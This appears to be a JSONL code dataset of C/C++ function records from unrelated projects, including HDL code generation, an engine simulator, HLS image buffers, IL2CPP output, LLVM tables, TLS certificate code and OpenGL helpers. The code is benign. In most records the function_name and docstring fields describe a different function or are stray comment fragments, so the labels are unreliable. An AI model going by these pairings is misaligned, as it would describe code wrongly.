{"content":"{'function_name': 'track_generators', 'docstring': '\/\/ if we need to track if a generator has been touched for verilog', 'code': 'std::map<std::string, std::string> generate_verilog_no_pkg(Generator* top,\\n                                                           SystemVerilogCodeGenOptions options) {\\n    \/\/ this pass assumes that all the generators has been uniquified\\n    std::map<std::string, std::string> result;\\n    \/\/ first get all the unique generators\\n    UniqueGeneratorVisitor unique_visitor;\\n    \/\/ this can be parallelized\\n    unique_visitor.visit_generator_root(top);\\n    auto const& generator_map = unique_visitor.generator_map();\\n    \/\/ codegen in parallel\\n    uint32_t num_cpus = get_num_cpus();\\n    cxxpool::thread_pool pool{num_cpus};\\n    std::vector<std::future<std::pair<std::string, std::string>>> tasks;\\n    tasks.reserve(generator_map.size());\\n    for (const auto& [module_name, module_gen] : generator_map) {\\n        auto t = pool.push(\\n            [&options](const std::string& name, Generator* g) {\\n                SystemVerilogCodeGen codegen(g, options);\\n                return std::pair(name, codegen.str());\\n            },\\n            module_name, module_gen);\\n        tasks.emplace_back(std::move(t));\\n    }\\n    for (auto& t : tasks) {\\n        auto r = t.get();\\n        result.emplace(r);\\n    }\\n\\n    track_generators(top);\\n    return result;\\n}'}","id":706}
{"content":"{'function_name': 'P_Header', 'docstring': '\/\/  page +=       \"<h2>I\/O Dashboard<\/h2>\";', 'code': 'String P_Menu(){\\n  String page =       \"<ul class=\\'nav nav-pills\\'>\";\\n  page +=         \"<li class=\\'active\\'><a href=\\'\/input\\'>Input<\/a><\/li>\";\\n  page +=         \"<li class=\\'active\\'><a href=\\'\/output\\'>Output<\/a><\/li>\";\\n\/*\\n  page +=         \"<li class=\\'active\\'><a href=\\'#\\'> <span class=\\'badge pull-right\\'>\";\\n  page +=         random(10, 20);\\n  page +=         \"<\/span>Meldungen<\/a><\/li>\";\\n*\/\\n  page +=         \"<\/ul>\";\\n  return page;  \\n}'}","id":710}
{"content":"{'function_name': 'termination_handler', 'docstring': '\/\/  }', 'code': 'int main(int argc, char** argv) {\\n\\t\/*\\n\\t * System initializations.\\n\\t * - HAL initialization, this also initializes the configured device drivers\\n\\t *   and performs the board-specific initializations.\\n\\t * - Kernel initialization, the main() function becomes a thread and the\\n\\t *   RTOS is active.\\n\\t *\/\\n\\thalInit();\\n\\tchSysInit();\\n\\n\\tif (argc == 2) {\\n\\t\\tint timeoutSeconds = atoi(argv[1]);\\n\\t\\tprintf(\"Running rusEFI simulator for %d seconds, then exiting.\\\\n\\\\n\", timeoutSeconds);\\n\\n\\t\\tchSysLock();\\n\\t\\tchVTSetI(&exitTimer, MY_US2ST(timeoutSeconds * 1e6), [](void*) { exit(0); }, 0);\\n\\t\\tchSysUnlock();\\n\\t}\\n\\n\\t\/*\\n\\t * Console thread started.\\n\\t *\/\\n\\tcdtp = chThdCreateFromHeap(NULL, CONSOLE_WA_SIZE,\\n\\t\\t\\t\"sim\",\\n\\t\\t\\tNORMALPRIO + 1, console_thread, NULL);\\n\\n\\t\/*\\n\\t * Initializing connection\/disconnection events.\\n\\t *\/\\n\\tcputs(\"Shell service started on SD1, SD2\");\\n\\tcputs(\"  - Listening for connections on SD1\");\\n\\tchEvtRegister(chnGetEventSource(&SD1), &sd1fel, 1);\\n\\tcputs(\"  - Listening for connections on SD2\");\\n\\tchEvtRegister(chnGetEventSource(&SD2), &sd2fel, 2);\\n\\n\\trusEfiFunctionalTest();\\n\\n\\t\/*\\n\\t * Events servicing loop.\\n\\t *\/\\n\\twhile (!chThdShouldTerminateX()) {\\n\\t\\tchEvtDispatch(fhandlers, chEvtWaitOne(ALL_EVENTS));\\n\\t\\tprintPendingMessages();\\n\\t\\tchThdSleepMilliseconds(1);\\n\\t}\\n\\n\\t\/*\\n\\t * Clean simulator exit.\\n\\t *\/\\n\\tchEvtUnregister(chnGetEventSource(&SD1), &sd1fel);\\n\\tchEvtUnregister(chnGetEventSource(&SD2), &sd2fel);\\n\\treturn 0;\\n}'}","id":711}
{"content":"{'function_name': 'FirstNotReaptChar1', 'docstring': '\/\/\u904d\u5386\u5b57\u7b26\u4e32\uff0c\u5728\u76f8\u5e94\u4f4d\u7f6e++\uff0c\uff08\u540c\u65f6\uff0c\u4e0b\u6807\u5f3a\u5236\u8f6c\u6362\uff09', 'code': 'int main()\\n{\\n\\t\/**string src=\"ABBA\";\\n\\tstring dest=\"BBAA\";\\n\\n\\tbool ismatch=isMatch(src.c_str(),dest.c_str());\\n\\tif(ismatch)\\n\\t{\\n\\t\\tcout<<\"Match!\";\\n\\t}else \\n\\t{\\n\\t\\tcout<<\"Not Match\uff01\";\\n\\t}*\/\\n\\t\\n\\t\/**char* string=\"ABCDEF\";\\n\\t\/\/\u5b57\u7b26\u4e32\u7684\u957f\u5ea6\\n\\tcout<<strlen(string);\\n\\t\/\/\u5b57\u8282\u6570\\n\\tcout<<sizeof(string);\\n\\tchar* substring=\"ABC\";\\n\\tcout<<strStr(string,substring);*\/\\n\\n\\t\/**char* str=\"afacced\";\\n\\tcout<<FirstNotReaptChar2(str);*\/\\n\\t\\n\\t\/**char p1[256]=\"hello world!\";\\n\\tchar p2[256]=\"\";\\n\\tmemcpyTest(p2,p1,strlen(p1)+1);\\n\\tprintf(\"%s\\\\n\",p2);*\/\\n\\n\\tconst char* str=\"90\";\\n\\tcout<<str2int(str);\\n\\tgetchar();\\n\\treturn 0;\\n}'}","id":716}
{"content":"{'function_name': 'demosaicb_rd5_select', 'docstring': '\/\/__VIVADO_SYNTH__', 'code': 'inline hw_uint<16> demosaicb_rd6_select(denoise_cache& denoise, int d0, int d1) {\\n#ifdef __VIVADO_SYNTH__\\n#endif \/\/__VIVADO_SYNTH__\\n  \/\/ demosaicb_rd6 read pattern: { demosaicb_update_0[d0, d1] -> denoise[1 + 2d0, -1 + d1] : 0 <= d0 <= 960 and 0 <= d1 <= 1081 }\\n  \/\/ Read schedule : { demosaicb_update_0[d0, d1] -> [3 + d1, 2 + d0, 4] : 0 <= d0 <= 960 and 0 <= d1 <= 1081 }\\n  \/\/ Write schedule: { denoise_update_0[d0, d1] -> [2 + d1, 1 + d0, 3] : -1 <= d0 <= 961 and -1 <= d1 <= 1082 }\\n  \/\/ DD fold: { demosaicb_update_0[d0, d1] -> 1927 : 0 <= d0 <= 960 and 0 <= d1 <= 1081 }\\n  auto value_denoise_denoise_update_0_write1 = denoise.denoise_denoise_update_0_write1_merged_banks_9.peek_1927();\\n  return value_denoise_denoise_update_0_write1;\\n#ifndef __VIVADO_SYNTH__\\n\\tcout << \"Error: Unsupported offsets: \" << \" d0 = \" << d0  << \" d1 = \" << d1  << endl;\\n\\tassert(false);\\n\\treturn 0;\\n#endif \/\/__VIVADO_SYNTH__\\n}'}","id":729}
{"content":"{'function_name': 'Dictionary_2_Do_ICollectionCopyTo_TisIl2CppObject_m545661084_gshared', 'docstring': '\/\/ end catch (depth: 1)', 'code': 'void Dictionary_2_Do_ICollectionCopyTo_TisKeyValuePair_2_t2181304024_m3162410912_gshared (Dictionary_2_t3623983712 * __this, Il2CppArray * ___array, int32_t ___index, Transform_1_t1752518520 * ___transform, const MethodInfo* method)\\n{\\n\\tstatic bool s_Il2CppMethodIntialized;\\n\\tif (!s_Il2CppMethodIntialized)\\n\\t{\\n\\t\\til2cpp_codegen_initialize_method (Dictionary_2_Do_ICollectionCopyTo_TisKeyValuePair_2_t2181304024_m3162410912_MetadataUsageId);\\n\\t\\ts_Il2CppMethodIntialized = true;\\n\\t}\\n\\tType_t * V_0 = NULL;\\n\\tType_t * V_1 = NULL;\\n\\tException_t1145979430 * V_2 = NULL;\\n\\tException_t1145979430 * __last_unhandled_exception = 0;\\n\\tNO_UNUSED_WARNING (__last_unhandled_exception);\\n\\tException_t1145979430 * __exception_local = 0;\\n\\tNO_UNUSED_WARNING (__exception_local);\\n\\tint32_t __leave_target = 0;\\n\\tNO_UNUSED_WARNING (__leave_target);\\n\\t{\\n\\t\\tIL2CPP_RUNTIME_CLASS_INIT(Type_t_il2cpp_TypeInfo_var);\\n\\t\\tType_t * L_0 = Type_GetTypeFromHandle_m432505302(NULL \/*static, unused*\/, (RuntimeTypeHandle_t2078935215 )LoadTypeToken(IL2CPP_RGCTX_TYPE(method->rgctx_data, 0)), \/*hidden argument*\/NULL);\\n\\t\\tV_0 = (Type_t *)L_0;\\n\\t\\tIl2CppArray * L_1 = ___array;\\n\\t\\tNullCheck((Il2CppObject *)L_1);\\n\\t\\tType_t * L_2 = Object_GetType_m191970594((Il2CppObject *)L_1, \/*hidden argument*\/NULL);\\n\\t\\tNullCheck((Type_t *)L_2);\\n\\t\\tType_t * L_3 = VirtFuncInvoker0< Type_t * >::Invoke(43 \/* System.Type System.Type::GetElementType() *\/, (Type_t *)L_2);\\n\\t\\tV_1 = (Type_t *)L_3;\\n\\t}\\n\\nIL_0017:\\n\\ttry\\n\\t{ \/\/ begin try (depth: 1)\\n\\t\\t{\\n\\t\\t\\tType_t * L_4 = V_0;\\n\\t\\t\\tNullCheck((Type_t *)L_4);\\n\\t\\t\\tbool L_5 = VirtFuncInvoker0< bool >::Invoke(30 \/* System.Boolean System.Type::get_IsPrimitive() *\/, (Type_t *)L_4);\\n\\t\\t\\tif (L_5)\\n\\t\\t\\t{\\n\\t\\t\\t\\tgoto IL_002d;\\n\\t\\t\\t}\\n\\t\\t}\\n\\nIL_0022:\\n\\t\\t{\\n\\t\\t\\tType_t * L_6 = V_1;\\n\\t\\t\\tNullCheck((Type_t *)L_6);\\n\\t\\t\\tbool L_7 = VirtFuncInvoker0< bool >::Invoke(30 \/* System.Boolean System.Type::get_IsPrimitive() *\/, (Type_t *)L_6);\\n\\t\\t\\tif (!L_7)\\n\\t\\t\\t{\\n\\t\\t\\t\\tgoto IL_003f;\\n\\t\\t\\t}\\n\\t\\t}\\n\\nIL_002d:\\n\\t\\t{\\n\\t\\t\\tType_t * L_8 = V_1;\\n\\t\\t\\tType_t * L_9 = V_0;\\n\\t\\t\\tNullCheck((Type_t *)L_8);\\n\\t\\t\\tbool L_10 = VirtFuncInvoker1< bool, Type_t * >::Invoke(40 \/* System.Boolean System.Type::IsAssignableFrom(System.Type) *\/, (Type_t *)L_8, (Type_t *)L_9);\\n\\t\\t\\tif (L_10)\\n\\t\\t\\t{\\n\\t\\t\\t\\tgoto IL_003f;\\n\\t\\t\\t}\\n\\t\\t}\\n\\nIL_0039:\\n\\t\\t{\\n\\t\\t\\tException_t1145979430 * L_11 = (Exception_t1145979430 *)il2cpp_codegen_object_new(Exception_t1145979430_il2cpp_TypeInfo_var);\\n\\t\\t\\tException__ctor_m3886110570(L_11, \/*hidden argument*\/NULL);\\n\\t\\t\\tIL2CPP_RAISE_MANAGED_EXCEPTION(L_11);\\n\\t\\t}\\n\\nIL_003f:\\n\\t\\t{\\n\\t\\t\\tIl2CppArray * L_12 = ___array;\\n\\t\\t\\tint32_t L_13 = ___index;\\n\\t\\t\\tTransform_1_t1752518520 * L_14 = ___transform;\\n\\t\\t\\tNullCheck((Dictionary_2_t3623983712 *)__this);\\n\\t\\t\\t((  void (*) (Dictionary_2_t3623983712 *, ObjectU5BU5D_t3632007997*, int32_t, Transform_1_t1752518520 *, const MethodInfo*))IL2CPP_RGCTX_METHOD_INFO(method->rgctx_data, 1)->method)((Dictionary_2_t3623983712 *)__this, (ObjectU5BU5D_t3632007997*)((ObjectU5BU5D_t3632007997*)Castclass(L_12, ObjectU5BU5D_t3632007997_il2cpp_TypeInfo_var)), (int32_t)L_13, (Transform_1_t1752518520 *)L_14, \/*hidden argument*\/IL2CPP_RGCTX_METHOD_INFO(method->rgctx_data, 1));\\n\\t\\t\\tgoto IL_0069;\\n\\t\\t}\\n\\t} \/\/ end try (depth: 1)\\n\\tcatch(Il2CppExceptionWrapper& e)\\n\\t{\\n\\t\\t__exception_local = (Exception_t1145979430 *)e.ex;\\n\\t\\tif(il2cpp_codegen_class_is_assignable_from (Exception_t1145979430_il2cpp_TypeInfo_var, e.ex->object.klass))\\n\\t\\t\\tgoto CATCH_0052;\\n\\t\\tthrow e;\\n\\t}\\n\\nCATCH_0052:\\n\\t{ \/\/ begin catch(System.Exception)\\n\\t\\t{\\n\\t\\t\\tV_2 = (Exception_t1145979430 *)((Exception_t1145979430 *)__exception_local);\\n\\t\\t\\tException_t1145979430 * L_15 = V_2;\\n\\t\\t\\tArgumentException_t2320721629 * L_16 = (ArgumentException_t2320721629 *)il2cpp_codegen_object_new(ArgumentException_t2320721629_il2cpp_TypeInfo_var);\\n\\t\\t\\tArgumentException__ctor_m3312963299(L_16, (String_t*)_stringLiteral3845490374, (String_t*)_stringLiteral1185213181, (Exception_t1145979430 *)L_15, \/*hidden argument*\/NULL);\\n\\t\\t\\tIL2CPP_RAISE_MANAGED_EXCEPTION(L_16);\\n\\t\\t}\\n\\nIL_0064:\\n\\t\\t{\\n\\t\\t\\tgoto IL_0069;\\n\\t\\t}\\n\\t} \/\/ end catch (depth: 1)\\n\\nIL_0069:\\n\\t{\\n\\t\\treturn;\\n\\t}\\n}'}","id":757}
{"content":"{'function_name': 'denoiseb_rd38_select', 'docstring': '\/\/__VIVADO_SYNTH__', 'code': 'inline hw_uint<16> denoiseb_rd39_select(raw_cache& raw, int d0, int d1) {\\n#ifdef __VIVADO_SYNTH__\\n#endif \/\/__VIVADO_SYNTH__\\n  \/\/ denoiseb_rd39 read pattern: { denoiseb_update_0[d0, d1] -> raw[1 + 2d0, 2 + d1] : -1 <= d0 <= 961 and -1 <= d1 <= 1082 }\\n  \/\/ Read schedule : { denoiseb_update_0[d0, d1] -> [2 + d1, 1 + d0, 2] : -1 <= d0 <= 961 and -1 <= d1 <= 1082 }\\n  \/\/ Write schedule: { raw_update_0[d0, d1] -> [d1, d0, 1] : -2 <= d0 <= 962 and -3 <= d1 <= 1084 }\\n  \/\/ DD fold: { denoiseb_update_0[d0, d1] -> 1 : -1 <= d0 <= 961 and -1 <= d1 <= 1082 }\\n  auto value_raw_raw_update_0_write1 = raw.raw_raw_update_0_write1_merged_banks_25.peek_1();\\n  return value_raw_raw_update_0_write1;\\n#ifndef __VIVADO_SYNTH__\\n\\tcout << \"Error: Unsupported offsets: \" << \" d0 = \" << d0  << \" d1 = \" << d1  << endl;\\n\\tassert(false);\\n\\treturn 0;\\n#endif \/\/__VIVADO_SYNTH__\\n}'}","id":762}
{"content":"{'function_name': 'l2_norm_toyexample', 'docstring': '\/\/ cout << \"x = \" << x << endl;', 'code': 'NumericMatrix init_system_matrix_derivative_toyexample(NumericVector param, NumericVector pgrad, int nx)\\n{\\n    int kx = 0, kml=0, i0=0, i1=0;\\n    int nml = 0;\\n    nml = compute_matrix_dimension_toyexample(nx);\\n    NumericMatrix mle_grad(nml, 3);\\n    \/\/ boundary element\\n    kml = 0;\\n    i0 = 0;\\n    i1 = 0;\\n    mle_grad(kml, 0) = i0;\\n    mle_grad(kml, 1) = i1;\\n    mle_grad(kml, 2) = 0.0;\\n    kml = kml + 1;\\n\\n    i0 = 0;\\n    i1 = 1;\\n    mle_grad(kml, 0) = i0;\\n    mle_grad(kml, 1) = i1;\\n    mle_grad(kml, 2) = 0.0;\\n    kml = kml + 1;\\n\\n    \/\/ central elements\\n    for(kx = 1; kx < (nx - 1); kx++)\\n    {\\n        i0 = kx;\\n        i1 = kx;\\n        mle_grad(kml, 0) = i0;\\n        mle_grad(kml, 1) = i1;\\n        mle_grad(kml, 2) = 0.0;\\n        kml = kml + 1;\\n\\n        i0 = kx;\\n        i1 = kx + 1;\\n        mle_grad(kml, 0) = i0;\\n        mle_grad(kml, 1) = i1;\\n        mle_grad(kml, 2) = 0.0;\\n        kml = kml + 1;\\n\\n        i0 = kx;\\n        i1 = kx - 1;\\n        mle_grad(kml, 0) = i0;\\n        mle_grad(kml, 1) = i1;\\n        mle_grad(kml, 2) = 0.0;\\n        kml = kml + 1;\\n    }\\n\\n    i0 = nx - 1;\\n    i1 = nx - 1;\\n    mle_grad(kml, 0) = i0;\\n    mle_grad(kml, 1) = i1;\\n    mle_grad(kml, 2) = 0.0;\\n    kml = kml + 1;\\n\\n    i0 = nx - 1;\\n    i1 = nx - 2;\\n    mle_grad(kml, 0) = i0;\\n    mle_grad(kml, 1) = i1;\\n    mle_grad(kml, 2) = 0.0;\\n    kml = kml + 1;\\n\\n    return mle_grad;\\n}'}","id":769}
{"content":"{'function_name': 'getDisp12Opcode', 'docstring': \"\/\/ Instruction doesn't exist in this table.\", 'code': \"LLVM_READONLY\\nint getDisp20Opcode(uint16_t Opcode) {\\nstatic const uint16_t getDisp20OpcodeTable[][2] = {\\n  { SystemZ::A, SystemZ::AY },\\n  { SystemZ::AH, SystemZ::AHY },\\n  { SystemZ::AL, SystemZ::ALY },\\n  { SystemZ::C, SystemZ::CY },\\n  { SystemZ::CH, SystemZ::CHY },\\n  { SystemZ::CL, SystemZ::CLY },\\n  { SystemZ::CLI, SystemZ::CLIY },\\n  { SystemZ::CS, SystemZ::CSY },\\n  { SystemZ::IC, SystemZ::ICY },\\n  { SystemZ::IC32, SystemZ::IC32Y },\\n  { SystemZ::L, SystemZ::LY },\\n  { SystemZ::LA, SystemZ::LAY },\\n  { SystemZ::LD, SystemZ::LDY },\\n  { SystemZ::LE, SystemZ::LEY },\\n  { SystemZ::LH, SystemZ::LHY },\\n  { SystemZ::MH, SystemZ::MHY },\\n  { SystemZ::MS, SystemZ::MSY },\\n  { SystemZ::MVI, SystemZ::MVIY },\\n  { SystemZ::N, SystemZ::NY },\\n  { SystemZ::NI, SystemZ::NIY },\\n  { SystemZ::O, SystemZ::OY },\\n  { SystemZ::OI, SystemZ::OIY },\\n  { SystemZ::S, SystemZ::SY },\\n  { SystemZ::SH, SystemZ::SHY },\\n  { SystemZ::SL, SystemZ::SLY },\\n  { SystemZ::ST, SystemZ::STY },\\n  { SystemZ::STC, SystemZ::STCY },\\n  { SystemZ::STD, SystemZ::STDY },\\n  { SystemZ::STE, SystemZ::STEY },\\n  { SystemZ::STH, SystemZ::STHY },\\n  { SystemZ::TM, SystemZ::TMY },\\n  { SystemZ::X, SystemZ::XY },\\n  { SystemZ::XI, SystemZ::XIY },\\n}; \/\/ End of getDisp20OpcodeTable\\n\\n  unsigned mid;\\n  unsigned start = 0;\\n  unsigned end = 33;\\n  while (start < end) {\\n    mid = start + (end - start)\/2;\\n    if (Opcode == getDisp20OpcodeTable[mid][0]) {\\n      break;\\n    }\\n    if (Opcode < getDisp20OpcodeTable[mid][0])\\n      end = mid;\\n    else\\n      start = mid + 1;\\n  }\\n  if (start == end)\\n    return -1; \/\/ Instruction doesn't exist in this table.\\n\\n  return getDisp20OpcodeTable[mid][1];\\n}\"}","id":771}
{"content":"{'function_name': 'parse_eight_digits_unrolled', 'docstring': '\/\/ val = (val * 2561) >> 8;', 'code': 'fastfloat_really_inline\\nvalue128 compute_product_approximation(int64_t q, uint64_t w) {\\n  const int index = 2 * int(q - powers::smallest_power_of_five);\\n  \/\/ For small values of q, e.g., q in [0,27], the answer is always exact because\\n  \/\/ The line value128 firstproduct = full_multiplication(w, power_of_five_128[index]);\\n  \/\/ gives the exact answer.\\n  value128 firstproduct = full_multiplication(w, powers::power_of_five_128[index]);\\n  static_assert((bit_precision >= 0) && (bit_precision <= 64), \" precision should  be in (0,64]\");\\n  constexpr uint64_t precision_mask = (bit_precision < 64) ?\\n               (uint64_t(0xFFFFFFFFFFFFFFFF) >> bit_precision)\\n               : uint64_t(0xFFFFFFFFFFFFFFFF);\\n  if((firstproduct.high & precision_mask) == precision_mask) { \/\/ could further guard with  (lower + w < lower)\\n    \/\/ regarding the second product, we only need secondproduct.high, but our expectation is that the compiler will optimize this extra work away if needed.\\n    value128 secondproduct = full_multiplication(w, powers::power_of_five_128[index + 1]);\\n    firstproduct.low += secondproduct.high;\\n    if(secondproduct.high > firstproduct.low) {\\n      firstproduct.high++;\\n    }\\n  }\\n  return firstproduct;\\n}'}","id":779}
{"content":"{'function_name': 'MimeOleGetAlternativeSection', 'docstring': '\/\/ If no Create, fail\\r', 'code': 'MIMEOLEAPI MimeOleGenerateCID(LPSTR pszCID, ULONG cchMax, boolean fAbsolute)\\r\\n{\\r\\n    \/\/ Locals\\r\\n    HRESULT         hr=S_OK;\\r\\n    ULONG           cch;\\r\\n    FILETIME        ft;\\r\\n    SYSTEMTIME      st;\\r\\n    WORD            wCounter;\\r\\n\\r\\n    \/\/ Invalid Arg\\r\\n    if (NULL == pszCID)\\r\\n        return TrapError(E_INVALIDARG);\\r\\n\\r\\n    \/\/ Get Current Time\\r\\n    GetSystemTime(&st);\\r\\n\\r\\n    \/\/ Convert to FileTime\\r\\n    SystemTimeToFileTime(&st, &ft);\\r\\n\\r\\n    \/\/ Build MessageID\\r\\n    if (FALSE == fAbsolute)\\r\\n        cch = wnsprintfA(pszCID, cchMax, \"%04x%08.8lx$%08.8lx$%s@%s\", DwCounterNext(), ft.dwHighDateTime, ft.dwLowDateTime, (LPTSTR)SzGetLocalPackedIP(), PszGetDomainName());\\r\\n    else\\r\\n        cch = wnsprintfA(pszCID, cchMax, \"CID:%04x%08.8lx$%08.8lx$%s@%s\", DwCounterNext(), ft.dwHighDateTime, ft.dwLowDateTime, (LPTSTR)SzGetLocalPackedIP(), PszGetDomainName());\\r\\n\\r\\n    \/\/ Buffer Overwrite\\r\\n    Assert(cch + 1 <= CCHMAX_CID);\\r\\n\\r\\n    \/\/ Done\\r\\n    return hr;\\r\\n}'}","id":788}
{"content":"{'function_name': 'draw_cube', 'docstring': '\/\/ glColor4f(g_color[0]);\\t\\r', 'code': 'GLuint loadTexture(Image* image) {\\r\\n\\tGLuint textureId;\\r\\n\\tglGenTextures(1, &textureId); \/\/Make room for our texture\\r\\n\\tglBindTexture(GL_TEXTURE_2D, textureId); \/\/Tell OpenGL which texture to edit\\r\\n\\t\/\/Map the image to the texture\\r\\n\\tglTexImage2D(GL_TEXTURE_2D,                \/\/Always GL_TEXTURE_2D\\r\\n\\t\\t\\t\\t 0,                            \/\/0 for now\\r\\n\\t\\t\\t\\t GL_RGB,                       \/\/Format OpenGL uses for image\\r\\n\\t\\t\\t\\t image->width, image->height,  \/\/Width and height\\r\\n\\t\\t\\t\\t 0,                            \/\/The border of the image\\r\\n\\t\\t\\t\\t GL_RGB, \/\/GL_RGB, because pixels are stored in RGB format\\r\\n\\t\\t\\t\\t GL_UNSIGNED_BYTE, \/\/GL_UNSIGNED_BYTE, because pixels are stored\\r\\n\\t\\t\\t\\t                   \/\/as unsigned numbers\\r\\n\\t\\t\\t\\t image->pixels);               \/\/The actual pixel data\\r\\n\\treturn textureId; \/\/Returns the id of the texture\\r\\n}'}","id":795}
{"content":"{'function_name': 'vnUnpackFixedPixel', 'docstring': '\/\/', 'code': 'VN_STATUS vnConvertToBlock( UINT8 * pRawPixel, VN_IMAGE_FORMAT internalFormat, VN_PIXEL_BLOCK * pOutBlock )\\n{\\n    if ( VN_PARAM_CHECK )\\n    {\\n        if ( !pRawPixel || !VN_IS_FORMAT_VALID( internalFormat ) || !pOutBlock )\\n        {\\n            return vnPostError( VN_ERROR_INVALIDARG );\\n        }\\n    }\\n\\n    \/\/\\n    \/\/ The design of this function aimed at balancing simplicity and ease of readability, with performance. We try\\n    \/\/ to push as many branches out as possible (with the channel inner branch a necessity due to formats with \\n    \/\/ heterogeneous channel rates).\\n    \/\/\\n\\n    BOOL bFloatFormat = !!( VN_IS_FLOAT_FORMAT( internalFormat ) );\\n\\n    if ( bFloatFormat ) return vnUnpackFloatPixel( pRawPixel, internalFormat, pOutBlock );\\n    else                return vnUnpackFixedPixel( pRawPixel, internalFormat, pOutBlock );\\n\\n    return VN_SUCCESS;\\n}'}","id":797}
{"content":"{'function_name': 'vnUnpackFloatChannel', 'docstring': '\/\/', 'code': 'VN_STATUS vnUnpackFixedChannel( UINT8 uiChannelRate, BOOL bSigned, UINT64 uiRawData, UINT64 * pOutChannel )\\n{\\n    \/\/\\n    \/\/ This parameter check is exhaustive, since this function is static and will not presently\\n    \/\/ be called with unchecked parameters, but we redundantly validate the parameters in case \\n    \/\/ this design changes in the future.\\n    \/\/\\n\\n    if ( VN_PARAM_CHECK )\\n    {\\n        if ( 0 == uiChannelRate || !pOutChannel )\\n        {\\n            return vnPostError( VN_ERROR_INVALIDARG );\\n        }\\n    }\\n\\n    \/\/\\n    \/\/ (!) We are expecting a logical shift here, and further expect that a shift \\n    \/\/     by 64 will produce a zero value. \\n    \/\/\\n\\n    UINT64 uiMaskChannelVal  = ( (UINT64) 1 << uiChannelRate ) - 1;     \/\/ bit mask for our channel\\n    UINT64 uiMaxChannelVal   = uiMaskChannelVal;                        \/\/ max unsigned value\\n     INT64  iMaxChannelVal   = (INT64) ( uiMaxChannelVal >> 1 );        \/\/ max signed value\\n     INT64  iMinChannelVal   = -iMaxChannelVal - 1;                     \/\/ min signed value\\n\\n    \/\/\\n    \/\/ This function unpacks fixed integer values and stores them in the lower \\n    \/\/ 32 bits of a signed 64 bit output. Note that unlike our float unpack equivalent, \\n    \/\/ this function returns the number of *bits* that were processed, rather than bytes.\\n    \/\/\\n\\n    if ( bSigned )\\n    {\\n        INT64 iRawData = (INT64) uiRawData;\\n\\n        \/\/\\n        \/\/ First we check our sign bit, and perform an extention if necessary.\\n        \/\/\\n\\n        if ( iRawData & ( (INT64) 1 << ( uiChannelRate - 1 ) ) )\\n        {\\n            iRawData |= ~uiMaskChannelVal;\\n        }\\n\\n        if ( iRawData < 0 )\\n        {\\n            (*pOutChannel)  = (INT64) VN_MIN_INT32 * iRawData \/ iMinChannelVal; \\n        }\\n        else\\n        {\\n            (*pOutChannel)  = (INT64) VN_MAX_INT32 * iRawData \/ iMaxChannelVal; \\n        }\\n    }\\n    \\n    \/\/\\n    \/\/ Otherwise, handle the unsigned channel case\\n    \/\/\\n\\n    else\\n    {\\n        (*pOutChannel) = (INT64) VN_MAX_INT32 * uiRawData \/ uiMaxChannelVal;\\n    }\\n\\n    return VN_SUCCESS;\\n}'}","id":799}
{"content":"{'function_name': 'TLSEncryptBase64EncodeHWID', 'docstring': '\/\/\\r', 'code': \"DWORD\\r\\nTLSAddCertAuthorityKeyIdExtension(\\r\\n    LPTSTR           szIssuer,\\r\\n    ULARGE_INTEGER*  CertSerialNumber, \\r\\n    PCERT_EXTENSION  pExtension\\r\\n    )\\r\\n\/*\\r\\n*\/\\r\\n{\\r\\n    \/\/\\r\\n    \/\/ Use CERT_AUTHORITY_KEY_ID2_INFO\\r\\n    \/\/ some structure not defined in SP3's wincrypt.h\\r\\n    \/\/\\r\\n    LSCERT_ALT_NAME_ENTRY certAltNameEntry;\\r\\n    LSCERT_AUTHORITY_KEY_ID2_INFO authKeyId2Info;\\r\\n\\r\\n    memset(&authKeyId2Info, 0, sizeof(authKeyId2Info));\\r\\n    authKeyId2Info.AuthorityCertSerialNumber.cbData = sizeof(ULARGE_INTEGER);\\r\\n    authKeyId2Info.AuthorityCertSerialNumber.pbData = (PBYTE)CertSerialNumber;\\r\\n\\r\\n\\r\\n    memset(&certAltNameEntry, 0, sizeof(certAltNameEntry));\\r\\n    certAltNameEntry.dwAltNameChoice=CERT_ALT_NAME_DIRECTORY_NAME; \/\/LSCERT_ALT_NAME_RFC822_NAME;\\r\\n    certAltNameEntry.DirectoryName.cbData = (_tcslen(szIssuer) + 1) * sizeof(TCHAR);\\r\\n    certAltNameEntry.DirectoryName.pbData = (PBYTE)szIssuer;\\r\\n\\r\\n    authKeyId2Info.AuthorityCertIssuer.cAltEntry=1;\\r\\n    authKeyId2Info.AuthorityCertIssuer.rgAltEntry=&certAltNameEntry; \\r\\n  \\r\\n    pExtension->pszObjId = szOID_X509_AUTHORITY_KEY_ID2;\\r\\n    pExtension->fCritical = TRUE;\\r\\n    \\r\\n    return TLSCryptEncodeObject(\\r\\n                        X509_ASN_ENCODING | PKCS_7_ASN_ENCODING,\\r\\n                        szOID_X509_AUTHORITY_KEY_ID2, \\r\\n                        &authKeyId2Info, \\r\\n                        &pExtension->Value.pbData,\\r\\n                        &pExtension->Value.cbData\\r\\n                    );\\r\\n}\"}","id":803}
{"content":"{'function_name': 'framebufferSizeCallback', 'docstring': '\/\/ resize window', 'code': 'GLsizei bindFaces(GLuint VAO, GLuint VBO, const Obj& obj)\\n{\\n    \/\/ bind VAO\\n    glBindVertexArray(VAO);\\n\\n    \/\/ bind VBO, buffer data to it\\n    glBindBuffer(GL_ARRAY_BUFFER, VBO);\\n\\n    std::vector<VertRandColor> data;\\n    for (const auto& face : obj.faces) {\\n        for (int i = 0; i < 3; i++) {\\n            int vid = face[i] - 1;\\n            data.emplace_back(obj.vertices[vid]);\\n        }\\n    }\\n\\n    glBufferData(GL_ARRAY_BUFFER, sizeof(VertRandColor) * data.size(), &data.front(), GL_STATIC_DRAW);\\n\\n    \/\/ set vertex attribute pointers\\n    \/\/ position attribute\\n    glVertexAttribPointer(0, 3, GL_FLOAT, GL_FALSE, sizeof(VertRandColor), (GLvoid*)0);\\n    glEnableVertexAttribArray(0);\\n    \/\/ color attribute\\n    glVertexAttribPointer(1, 3, GL_FLOAT, GL_FALSE, sizeof(VertRandColor), (GLvoid*)(3 * sizeof(GLfloat)));\\n    glEnableVertexAttribArray(1);\\n\\n    \/\/ unbind VBO & VAO\\n    glBindBuffer(GL_ARRAY_BUFFER, 0);\\n    glBindVertexArray(0);\\n\\n    return GLsizei(data.size());\\n}'}","id":804}
